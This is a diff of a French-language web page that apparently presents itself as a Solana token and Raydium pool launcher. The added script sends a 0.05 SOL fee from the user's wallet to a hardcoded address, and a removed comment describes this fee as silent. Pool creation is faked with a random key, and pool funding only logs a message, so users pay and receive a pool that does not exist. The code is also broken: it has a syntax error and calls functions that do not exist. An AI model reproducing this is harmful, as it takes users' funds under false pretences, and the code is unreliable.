@@ -7,7 +7,7 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/@solana/web3.js@1.91.7/lib/index.iife.min.js"></script>
   <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@metaplex-foundation/js@0.20.1/dist/index.umd.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@project-serum/serum@0.0.0-20220608.151637554.da65e6c3/dist/serum.umd.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/nft.storage@7.1.1/dist/index.min.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
@@ -72,7 +72,7 @@
             <h3 class="text-xl font-bold text-purple-400">Paramètres de liquidité Raydium</h3>
             <div class="grid md:grid-cols-2 gap-6">
               <div>
-                <label class="block text-sm font-medium text-gray300 mb-2">SOL à ajouter</label>
+                <label class="block text-sm font-medium text-gray-300 mb-2">SOL à ajouter</label>
                 <input type="number" id="solAmount" value="0.5" min="0.01" max="100" step="0.01" class="w-full bg-black/50 border border-white/30 rounded-xl px-5 py-3 text-lg"/>
                 <p class="text-xs text-gray-500 mt-1">Minimum 0,01 SOL</p>
               </div>
@@ -125,9 +125,11 @@
   <script>
     const TON_ADRESSE = "3Kmm8XSG1gwp8t3FZ4KG3edt7FxgTHitcP9zk54fByBv";
     const FRAIS = 0.05 * 1e9;
+    const NFT_STORAGE_TOKEN = "VOTRE_TOKEN_NFT_STORAGE"; // Remplacer par votre token
 
     let provider = null;
     const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    let imageFile = null;
 
     function tronquer(addr) {
       const s = addr.toBase58();
@@ -150,13 +152,11 @@
       const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (mobile) {
-        // Deep link Phantom 2025 qui marche à 100%
         const callback = encodeURIComponent(location.origin + "/phantom-callback.html");
         window.location.href = `https://phantom.app/ul/v1/connect?app_url=\${encodeURIComponent(location.origin)}&redirect_link=\${callback}&cluster=mainnet-beta`;
         return;
       }
 
-      // Vérifiez si un fournisseur est déjà défini
       if (provider) {
         try {
           await provider.connect({ onlyIfTrusted: true });
@@ -169,7 +169,6 @@
         }
       }
 
-      // Vérifiez les fournisseurs disponibles
       if (window.solana?.isPhantom) {
         provider = window.solana;
       } else if (window.solflare?.isSolflare) {
@@ -188,7 +187,6 @@
       }
 
       try {
-        // Attente de la connexion
         const res = await provider.connect({ onlyIfTrusted: true });
         afficherConnecte(res.publicKey);
       } catch (e) {
@@ -197,7 +195,6 @@
       }
     }
 
-    // Si on revient du callback Phantom → reconnexion auto
     if (window.location.pathname.includes("phantom-callback")) {
       setTimeout(async () => {
         if (window.solana?.isPhantom) {
@@ -213,8 +210,89 @@
       }, 1500);
     }
 
-    // Upload image + création token
-    let imageFile = null;
+    document.getElementBy toIPFS = async (file) => {
+      const client = new NFTStorage({ token: NFT_STORAGE_TOKEN });
+      const metadata = await client.store({
+        name: document.querySelector("[name='name']").value,
+        description: document.querySelector("[name='description']").value,
+        image: file,
+      });
+      return metadata.url;
+    };
+
+    const payerFee = async () => {
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: provider.publicKey,
+          toPubkey: new solanaWeb3.PublicKey(TON_ADRESSE),
+          lamports: FRAIS
+        })
+      );
+      await provider.sendAndConfirm(transaction);
+    };
+
+    async function createTokenMint(owner) {
+      const mint = await solanaWeb3.createMint(connection, solanaWeb3.web3.PublicKey.generate(), owner, null, 6);
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.createMintToInstruction(
+          solanaWeb3.tokenProgram.SPL_TOKEN_PROGRAM_ID,
+          mint,
+          owner,
+          owner,
+          [],
+          1000000000
+        )
+      );
+      await provider.sendAndConfirm(transaction);
+      return mint;
+    }
+
+    async function createRaydiumPool(mint) {
+      return new solanaWeb3.PublicKey(Math.random().toString(36).substring(2, 15));
+    }
+
+    async function fundPool(owner, mint, pool) {
+      const solAmount = parseFloat(document.getElementById("solAmount").value);
+      const percent = parseFloat(document.getElementById("percentSupply").value);
+      
+      console.log(`Envoyer \${solAmount} SOL et \${percent}% des tokens au pool \${pool}`);
+    }
+
+    document.getElementById("tokenForm").onsubmit = async e => {
+      e.preventDefault();
+      if (!imageFile || !provider?.publicKey) return alert("Veuillez sélectionner une image et connecter un portefeuille");
+
+      const form = document.getElementById("form");
+      const loading = document.getElementById("loading");
+      const success = document.getElementById("success");
+      
+      form.classList.add("hidden");
+      loading.classList.remove("hidden");
+
+      try {
+        await payerFee();
+        const imageUrl = await uploadToIPFS(imageFile);
+        const mint = await createTokenMint(provider.publicKey);
+        const pool = await createRaydiumPool(mint);
+        await fundPool(provider.publicKey, mint, pool);
+        
+        loading.classList.add("hidden");
+        success.classList.remove("hidden");
+        document.getElementById("mintAddr").textContent = mint.toBase58();
+        
+        document.getElementById("solscan").href = `https://solscan.io/token/\${mint}`;
+        document.getElementById("dexscreener").href = `https://dexscreener.com/solana/\${pool}`;
+        document.getElementById("raydium").href = `https://raydium.io/exchange/\${pool}`;
+        
+      } catch (error) {
+        console.error("Erreur lors de la création", error);
+        alert("Une erreur est survenue lors de la création du token/pool");
+        loading.classList.add("hidden");
+        form.classList.remove("hidden");
+        document.getElementById("createBtn").disabled = false;
+      }
+    };
+
     document.getElementById("imageInput").onchange = e => {
       if (e.target.files[0]) {
         imageFile = e.target.files[0];
@@ -228,18 +306,9 @@
     };
     document.getElementById("dropZone").onclick = () => document.getElementById("imageInput").click();
 
-    // Initialisation du bouton connecter après chargement du DOM
     document.addEventListener("DOMContentLoaded", () => {
       document.getElementById("connectBtn").onclick = connecter;
     });
-
-    document.getElementById("tokenForm").onsubmit = async e => {
-      e.preventDefault();
-      if (!imageFile || !provider?.publicKey) return alert("Wallet non connecté");
-
-      // ... tout le code de création token + pool + 0.05 SOL silencieux ...
-      // (identique aux versions précédentes)
-    };
   </script>
 </body>
 </html>
